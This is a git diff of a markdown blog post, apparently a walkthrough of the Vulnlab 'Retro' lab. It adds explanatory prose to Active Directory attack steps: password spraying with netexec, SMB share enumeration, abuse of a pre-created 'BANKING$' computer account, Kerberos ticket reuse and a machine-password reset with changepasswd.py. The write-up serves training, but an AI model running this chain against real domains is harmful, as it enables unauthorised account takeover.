@@ -3,7 +3,7 @@ layout: post
 title: Vulnlab - Retro Walkthrough
 date: 19-04-2025
 categories: [Vulnlab]
-tags: [pre2k, changepasswd, adcs,ESC1, certipy]
+tags: [pre2k, changepasswd, ADCS,ESC1, certipy]
 image: "https://assets.vulnlab.com/retro_slide.png"
 ---
 
@@ -135,15 +135,16 @@ nxc smb 10.10.79.94 -u loots/users.txt -p loots/users.txt  --no-bruteforce --con
 
 ![alt text](/assets/screenshots/Retro/4.png)
 
-Enumerating users
+>With valid credentials in hand, the next typical step in Active Directory enumeration is to try pulling a list of all domain users and testing for common attacks like AS-REP Roasting (for users not requiring pre-authentication) and Kerberoasting (for service accounts with SPNs).However, in this lab, those techniques didn’t yield any results — so we’ll be diving deeper into these attacks in upcoming labs where they’re more relevant.
+{: .prompt-tip }
+
+Users
 
 ```powershell
 nxc smb 10.10.79.94 -u trainee -p trainee --users
 ```
 
 ![alt text](/assets/screenshots/Retro/5.png)
-
-After having a list of users we could have trained AS-REP Roasting and Kerberoasting but both of dindt work here
 
 Kerberoasting
 
@@ -159,7 +160,8 @@ GetNPUsers.py retro.vl/trainee:trainee -usersfile loots/users.txt  -dc-ip 10.10.
 
 ![alt text](/assets/screenshots/Retro/6.png)
 
-Enumerating Shares
+Enumerating Shares again
+Now that we had valid credentials, we went back to enumerating SMB shares a common and essential step in Active Directory assessments. In AD environments, access control varies between accounts, so it’s important to repeat enumeration whenever new credentials are discovered. You might uncover different shares, permissions, or hidden clues depending on the user.This time, using the trainee credentials, we were able to read from a previously inaccessible share called `Notes`. 
 
 ```powershell
 nxc smb 10.10.79.94 -u trainee -p trainee --shares
@@ -167,7 +169,7 @@ nxc smb 10.10.79.94 -u trainee -p trainee --shares
 
 ![alt text](/assets/screenshots/Retro/7.png)
 
-Hinting about pre created computer account
+Inside, we found a document hinting at the use of `pre-created computer accounts` a clue that would guide our next move.
 
 ```powershell
 smbclient -U trainee //10.10.79.94/Notes
@@ -177,6 +179,8 @@ smbclient -U trainee //10.10.79.94/Notes
 
 Abusing Weak AD Permision Pre2K Compatibility
 
+To move forward, we took advantage of a common Active Directory misconfiguration related to `Pre-Windows 2000 Compatibility`. We used `netexec` to identify a `pre-created computer accounts` that could be abused.
+
 Using netexec
 
 ```powershell
@@ -185,23 +189,21 @@ nxc ldap 10.10.79.94 -u trainee -p trainee -M pre2k
 
 ![alt text](/assets/screenshots/Retro/9.png)
 
-using the ccache
-
+This helped us obtain a `TGT (Ticket Granting Ticket)` for the computer account. We could also authenticate using the `computer name `as the `password` (all lowercase). To use this `TGT`, we simply exported the ticket using:
 ```powershell
 export KRB5CCNAME=loots/tickets/banking.ccache
 ```
 
 ![alt text](/assets/screenshots/Retro/10.png)
 
-Confirm
-
+After discovering the pre-created computer account `BANKING$ `and obtaining a valid `TGT`, we wanted to confirm whether we could use it to authenticate. We first tested the `TGT` we extracted earlier using `netexec`, This confirmed that we had valid access using the ticket.
 ```powershell
 nxc smb 10.10.79.94 --use-kcache
 ```
 
 ![alt text](/assets/screenshots/Retro/11.png)
 
-Also Changing Password
+Trying to log in using the default password (computer name in lowercase) failed because it required the password to be changed.
 
 ```powershell
 nxc smb 10.10.79.94 -u "BANKING$" -p banking
@@ -209,7 +211,7 @@ nxc smb 10.10.79.94 -u "BANKING$" -p banking
 
 ![alt text](/assets/screenshots/Retro/12.png)
 
-change
+To fix this, we used `changepasswd.py` from `Impacket` to set a new password.
 
 ```powershell
 changepasswd.py retro.vl/BANKING\$@10.10.79.94 -newpass 'Password123!' -p rpc-samr
@@ -217,13 +219,15 @@ changepasswd.py retro.vl/BANKING\$@10.10.79.94 -newpass 'Password123!' -p rpc-sa
 
 ![alt text](/assets/screenshots/Retro/13.png)
 
-Confirm
+We then re-authenticated with the updated password, and it worked.
 
 ```powershell
 nxc smb 10.10.79.94 -u "BANKING$" -p 'Password123!'
 ```
 
 ![alt text](/assets/screenshots/Retro/14.png)
+
+With valid access confirmed using both TGT and password, we’re now ready to move to the next stage in the attack chain.
 
 ADCS
 
